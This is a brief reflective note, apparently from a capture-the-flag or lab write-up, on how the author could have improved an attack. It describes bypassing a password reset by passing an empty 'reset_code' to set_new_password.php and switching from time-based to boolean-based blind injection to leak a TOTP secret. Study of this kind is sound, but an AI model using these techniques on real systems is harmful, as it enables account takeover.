Things I coulda improved on:
- Instead of getting a new code everytime I may have been able to apply an empty code at set_new_password.php after resetting once because it gets set to NULL in the code so I coulda done &reset_code=
^^ empty so it would be NULL.
- Instead of timebased I could've just seen if the password changed to the random value and if not then it would mean the TOTP_secret is not that character sequence (boolean based).
